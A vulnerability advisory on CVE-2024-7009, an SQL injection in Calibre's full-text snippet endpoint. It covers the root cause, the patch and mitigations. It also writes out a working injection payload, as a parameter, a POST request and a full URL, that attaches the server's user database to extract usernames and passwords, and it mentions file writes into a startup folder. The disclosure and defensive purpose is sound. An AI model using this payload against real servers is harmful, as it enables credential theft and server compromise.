### CVE-2024-7009: SQL Injection in Calibre (v7.15.0 and earlier)

#### 1. Detailed Summary of the CVE, Vulnerability Type (CWE), and Affected Versions

- **CVE Identifier**: CVE-2024-7009
- **Affected Software**: Calibre
- **Affected Versions**: <= v7.15.0
- **Vulnerability Type**: SQL Injection (CWE-89)
  - **CWE Description**: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') occurs when a program does not properly sanitize user input that will be used in SQL queries, allowing attackers to manipulate the query in unintended ways.
  
  Calibre, a popular open-source e-book management software, is vulnerable to SQL injection in versions up to and including v7.15.0. The vulnerability arises in the `fts/snippets/{book_ids}` endpoint, which allows users with privileges to perform full-text searches on the Calibre library to inject arbitrary SQL code into the query. This SQL injection can enable an attacker to:
  - Extract sensitive information from SQLite databases on the server.
  - Perform limited file writes to the filesystem, potentially compromising the server.
  
  The vulnerability occurs because user input, specifically the `highlight_start` and `highlight_end` parameters in the search query, are not properly sanitized before being used in SQL commands.

#### 2. Root Cause of the Vulnerability

The root cause of the vulnerability is improper sanitization of user inputs before they are used in SQL queries. Specifically, the `highlight_start` and `highlight_end` parameters, which are passed as part of the query to the SQL execution function, are not sanitized or parameterized before being inserted into the query string. 

Here's a breakdown of how the vulnerability occurs:

1. **Code Path**:
   - The vulnerability is located in the `/fts/snippets/{book_ids}` endpoint, found in `src/calibre/srv/fts.py`. This endpoint performs a full-text search query on the Calibre library.
   - User input from the `highlight_start` and `highlight_end` parameters is passed directly into the SQL query string, which is a **string interpolation** vulnerability. This creates an opportunity for SQL injection, as an attacker can craft malicious input to manipulate the query.

2. **Code Analysis (Line of Vulnerability)**:
   - In `src/calibre/db/fts/connect.py`, the vulnerable code constructs the SQL query to perform the full-text search:
   
     ```python
     text = f'''snippet("{fts_table}", 0, '{highlight_start}', '{highlight_end}', '…', {max(1, min(snippet_size, 64))})'''
     ```
   
   - The parameters `highlight_start` and `highlight_end` are directly inserted into the query string without any form of escaping or parameterization. This allows an attacker to inject arbitrary SQL code into these fields, which will be executed as part of the SQL query.

3. **Exploit Path**:
   - By crafting a malicious `highlight_end` value such as:
   
     ```
     ','',32) FROM books_text JOIN books_fts_stemmed ON fts_db.books_text.id = books_fts_stemmed.rowid WHERE "books_fts_stemmed" MATCH ?; attach 'C:\Users\Devesh\AppData\Roaming\calibre\server-users.sqlite' as suwu; select 1,1,name,pw from suwu.users;-- -
     ```
   
   - An attacker can manipulate the SQL query to include an `ATTACH` statement, allowing them to access other SQLite databases on the server's filesystem (such as `server-users.sqlite`, which contains user authentication information). The attacker can then extract sensitive data (e.g., usernames and passwords) from these databases.
   
4. **Potential for Data Writing**:
   - Additionally, the attacker can perform limited file write operations using the `ATTACH` command, which allows for writing to arbitrary files, such as placing a malicious script or batch file in a user's startup folder for future execution.

#### 3. Exploit Details and Steps

To exploit this vulnerability, an attacker must have the ability to perform a full-text search on the Calibre library via the `/fts/snippets/{book_ids}` endpoint. This vulnerability requires no user interaction beyond the attacker sending a crafted HTTP request to the vulnerable endpoint.

**Steps to Exploit**:

1. **Identify the Endpoint**:
   - The vulnerable endpoint is `/fts/snippets/{book_ids}`, which accepts a `POST` request with query parameters such as `query`, `query_id`, `highlight_start`, and `highlight_end`.

2. **Craft the Malicious Payload**:
   - An attacker can craft a query with an injected payload in the `highlight_end` parameter that manipulates the SQL query and executes arbitrary SQL commands. For example:
   
     ```
     highlight_end=','',32) FROM books_text JOIN books_fts_stemmed ON fts_db.books_text.id = books_fts_stemmed.rowid WHERE "books_fts_stemmed" MATCH ?; attach 'C:\Users\Devesh\AppData\Roaming\calibre\server-users.sqlite' as suwu; select 1,1,name,pw from suwu.users;-- -
     ```

3. **Execute the Malicious Query**:
   - Send a `POST` request to the vulnerable endpoint, e.g.,

     ```
     POST /fts/snippets/1?library_id=Calibre_Library&query=C&query_id=1&highlight_end=','',32) FROM books_text JOIN books_fts_stemmed ON fts_db.books_text.id = books_fts_stemmed.rowid WHERE "books_fts_stemmed" MATCH ?; attach 'C:\Users\Devesh\AppData\Roaming\calibre\server-users.sqlite' as suwu; select 1,1,name,pw from suwu.users;-- -
     ```

4. **Extract Sensitive Data**:
   - If the attacker knows the location of the `server-users.sqlite` file (e.g., `%AppData%` on Windows), they can access sensitive user data, such as usernames and passwords.
   
   - The attacker can then use the extracted credentials to compromise other parts of the system or further escalate privileges.

**Example Malicious URL**:
```
http://CALIBRE_SERVER/fts/snippets/1?library_id=Calibre_Library&query=C&query_id=1&highlight_end=','',32) FROM books_text JOIN books_fts_stemmed ON fts_db.books_text.id = books_fts_stemmed.rowid WHERE "books_fts_stemmed" MATCH ?; attach 'C:\Users\Devesh\AppData\Roaming\calibre\server-users.sqlite' as suwu; select 1,1,name,pw from suwu.users;-- -
```

#### 4. Suggested Mitigations

To mitigate the SQL injection vulnerability, the following actions should be taken:

1. **Sanitize User Inputs**:
   - The parameters `highlight_start` and `highlight_end` should be sanitized before being used in the SQL query. This can be done by escaping single quotes and other special characters in the input.

2. **Use Parameterized Queries**:
   - Wherever possible, parameterized queries should be used. For example, instead of directly embedding user input in the query string, the input should be passed as a parameter:
   
     ```python
     text = "snippet({fts_table}, 0, ?, ?, '…', {snippet_size})"
     data.append(highlight_start)
     data.append(highlight_end)
     ```

3. **Implement Least Privilege**:
   - Ensure that users have only the minimum privileges required for their tasks. For instance, restricting access to sensitive databases or data files can limit the potential impact of an attack.

4. **Review and Apply the Fix**:
   - The patch provided addresses this vulnerability by ensuring that the `highlight_start` and `highlight_end` parameters are passed as placeholders in the SQL query, preventing direct injection. This is implemented in the patch changes to the `fts.py`, `backend.py`, and `connect.py` files.

#### Patch Code Snippets:

- **Sanitizing Inputs** (Fixed in the patch):
  ```python
  text = "snippet({fts_table}, 0, ?, ?, '…', {snippet_size})"
  data.append(highlight_start)
  data.append(highlight_end)
  ```

This fix ensures that the `highlight_start` and `highlight_end` inputs are properly parameterized, mitigating the risk of SQL injection.

### Conclusion

The CVE-2024-7009 vulnerability in Calibre stems from improper input sanitization in full-text search queries. This allows an attacker to inject malicious SQL code into the query, potentially exposing sensitive data or allowing limited file manipulation. By sanitizing the `highlight_start` and `highlight_end` parameters and using parameterized queries, this vulnerability has been addressed in the provided patch. Users should update to a patched version of Calibre to mitigate this risk.